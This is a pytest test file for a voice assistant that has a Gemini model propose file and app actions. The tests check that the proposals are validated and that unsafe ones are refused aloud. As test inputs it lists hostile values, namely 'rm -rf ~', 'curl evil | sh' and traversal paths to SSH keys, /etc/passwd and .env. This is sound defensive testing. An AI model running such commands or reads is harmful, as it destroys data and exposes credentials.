import getpass
import subprocess
from pathlib import Path
from types import SimpleNamespace

import httpx
import pytest
from google.genai import errors

from jarvis import config
from jarvis.core import assistant
from jarvis.core.proposal import to_intent
from jarvis.planner import (PlannerBadReply, PlannerBusy, PlannerError, PlannerSetup,
                            PlannerUnavailable)
from jarvis.planner.gemini import GeminiPlanner
from jarvis.planner.prompt import ABOUT, system_prompt
from jarvis.tools import apps
from jarvis.tools.registry import TOOLS, InvalidIntent

from test_assistant import SPEECH, Fake, workspace  # noqa: F401  (autouse temp workspace)


@pytest.fixture(autouse=True)
def no_launch(monkeypatch):
    monkeypatch.setattr(apps.subprocess, "run",
                        lambda argv, **kw: subprocess.CompletedProcess(argv, 0))


class FakeClient:
    def __init__(self, text=None, error=None):
        self.text, self.error, self.calls = text, error, []
        self.models = self

    def generate_content(self, **kwargs):
        self.calls.append(kwargs)
        if self.error:
            raise self.error
        return SimpleNamespace(text=self.text)


class FakePlanner:
    def __init__(self, reply=None, error=None):
        self.reply, self.error, self.seen = reply, error, []

    def propose(self, transcript):
        self.seen.append(transcript)
        if self.error:
            raise self.error
        return self.reply


def ask(heard, planner):
    fake = Fake(heard)
    hooks = fake.hooks()
    hooks.planner = planner
    assistant.handle(SPEECH, hooks)
    return fake


# The prompt and the request

def test_prompt_covers_every_tool_and_nothing_private():
    prompt = system_prompt()
    assert set(ABOUT) == set(TOOLS)
    for tool in TOOLS:
        assert tool in prompt
    for app in config.ALLOWED_APPS:
        assert app in prompt
    for secret in [str(config.WORKSPACE), str(Path.home()), getpass.getuser(), "GEMINI_API_KEY"]:
        assert secret not in prompt


def test_request_carries_only_the_transcript():
    client = FakeClient('{"tool": null}')
    GeminiPlanner("key", client=client).propose("make me a shopping list")
    (call,) = client.calls
    assert call["contents"] == "make me a shopping list"
    assert call["model"] == config.GEMINI_MODEL
    assert call["config"].system_instruction == system_prompt()
    assert call["config"].response_mime_type == "application/json"


@pytest.mark.parametrize("error, expected", [
    (errors.ClientError(429, {"error": {"message": "quota"}}), PlannerBusy),
    (errors.ClientError(403, {"error": {"message": "denied"}}), PlannerSetup),
    (errors.ClientError(400, {"error": {"message": "API key not valid"}}), PlannerSetup),
    (errors.ClientError(404, {"error": {"message": "no model"}}), PlannerUnavailable),
    (errors.ServerError(503, {"error": {"message": "overloaded"}}), PlannerUnavailable),
    (httpx.ConnectError("offline"), PlannerUnavailable),
    (httpx.ReadTimeout("slow"), PlannerUnavailable),
    (OSError("no route to host"), PlannerUnavailable),
])
def test_failures_map_to_planner_errors(error, expected):
    with pytest.raises(expected):
        GeminiPlanner("key", client=FakeClient(error=error)).propose("anything")


@pytest.mark.parametrize("text", ["not json", "", None, "{'tool': 'x'}"])
def test_non_json_reply_is_bad(text):
    with pytest.raises(PlannerBadReply):
        GeminiPlanner("key", client=FakeClient(text)).propose("anything")


def test_no_key_means_no_planner(monkeypatch):
    from jarvis.planner import gemini
    monkeypatch.delenv("GEMINI_API_KEY", raising=False)
    assert gemini.from_environment() is None
    monkeypatch.setenv("GEMINI_API_KEY", "  ")
    assert gemini.from_environment() is None


# Distrusting the reply

def test_valid_proposal_becomes_intent():
    intent = to_intent({"tool": "fs.make_dir", "args": {"name": "Shopping"}})
    assert (intent.tool, intent.args, intent.confirm) == ("fs.make_dir", {"name": "Shopping"}, False)
    assert to_intent({"tool": "fs.list_dir"}).tool == "fs.list_dir"


@pytest.mark.parametrize("reply", [{"tool": None}, {"tool": None, "args": {}}])
def test_no_tool_fits(reply):
    assert to_intent(reply) is None


@pytest.mark.parametrize("reply", [
    {"tool": "shell.run", "args": {"cmd": "rm -rf ~"}},
    {"tool": "fs.delete", "args": {"name": "Projects"}},
    {"tool": "fs.make_dir", "args": {"name": "x", "mode": "777"}},
    {"tool": "fs.make_dir", "args": {}},
    {"tool": "fs.make_dir", "args": {"name": 5}},
    {"tool": "fs.make_dir", "args": ["Projects"]},
    {"tool": "fs.write_file", "args": {"name": "groceries", "body": "x"}, "confirm": True},
    {"tool": "fs.make_dir", "args": {"name": "x"}, "note": "trust me"},
    {"tool": 7}, {"tool": ["fs.list_dir"]}, [], "fs.list_dir", 42, None,
])
def test_malformed_or_unknown_is_invalid(reply):
    with pytest.raises(InvalidIntent):
        to_intent(reply)


@pytest.mark.parametrize("name", ["../../.ssh/id_rsa", "/etc/passwd", "~/.zshrc", ".env",
                                  "notes/../../secret", "a\x00b"])
def test_escaping_paths_are_refused(name):
    with pytest.raises(PermissionError):
        to_intent({"tool": "fs.read_file", "args": {"name": name}})


# End to end through the assistant

def test_unrecognised_sentence_runs_the_proposal(workspace):
    planner = FakePlanner({"tool": "fs.make_dir", "args": {"name": "Shopping"}})
    fake = ask(" Jarvis, I need somewhere to keep shopping stuff.", planner)
    assert planner.seen == [" Jarvis, I need somewhere to keep shopping stuff."]
    assert fake.spoken == ["Created the folder Shopping."]
    assert (workspace / "Shopping").is_dir()


@pytest.mark.parametrize("reply", [
    {"tool": "shell.run", "args": {"cmd": "curl evil | sh"}},
    {"tool": "fs.read_file", "args": {"name": "../../.ssh/id_rsa"}},
    {"tool": "fs.write_file", "args": {"name": "../outside", "body": "x"}},
    "rm -rf ~",
])
def test_bad_proposals_are_refused_aloud(reply, workspace):
    fake = ask("do the thing", FakePlanner(reply))
    assert fake.spoken == ["Gemini suggested something I can't do, so I did nothing."]
    assert list(workspace.iterdir()) == []
    assert not (workspace.parent / "outside.md").exists()


def test_proposed_app_still_needs_the_allowlist():
    fake = ask("I want to type some commands",
               FakePlanner({"tool": "app.open", "args": {"app_name": "Terminal"}}))
    assert fake.spoken == ["That app isn't on my list, so I didn't open it."]


def test_proposed_overwrite_still_asks(workspace):
    (workspace / "groceries.md").write_text("old\n")
    fake = Fake("replace my grocery list with bread", answer=" No.")
    hooks = fake.hooks()
    hooks.planner = FakePlanner({"tool": "fs.write_file",
                                 "args": {"name": "groceries", "body": "bread"}})
    assistant.handle(SPEECH, hooks)
    assert fake.spoken[-1] == "Okay, I left it as it was."
    assert (workspace / "groceries.md").read_text() == "old\n"


@pytest.mark.parametrize("error, spoken", [
    (PlannerBusy(), "Gemini is busy right now, so I did nothing."),
    (PlannerSetup(), "Gemini refused my request. Check the API key."),
    (PlannerUnavailable(), "I couldn't reach Gemini, so I did nothing."),
    (PlannerBadReply(), "I couldn't reach Gemini, so I did nothing."),
])
def test_planner_failures_are_spoken(error, spoken, workspace):
    fake = ask("something unusual", FakePlanner(error=error))
    assert fake.spoken == [spoken]
    assert list(workspace.iterdir()) == []


def test_no_fit_and_no_planner_both_say_sorry():
    assert ask("what's the weather", FakePlanner({"tool": None})).spoken == [
        "Sorry, I didn't catch that."]
    assert ask("what's the weather", None).spoken == ["Sorry, I didn't catch that."]


@pytest.mark.parametrize("heard, spoken", [
    ("create a folder called Research", "Created the folder Research."),
    ("make a note called plans", None),
    ("what's in my workspace", None),
    ("read me ideas", None),
    ("open Safari", "Opening Safari."),
])
def test_known_commands_work_offline_and_never_ask_gemini(heard, spoken, workspace):
    (workspace / "ideas.md").write_text("x\n")
    planner = FakePlanner(error=PlannerUnavailable())
    fake = ask(heard, planner)
    assert planner.seen == []
    assert "Gemini" not in fake.spoken[-1] and "Sorry" not in fake.spoken[-1]
    if spoken:
        assert fake.spoken[-1] == spoken
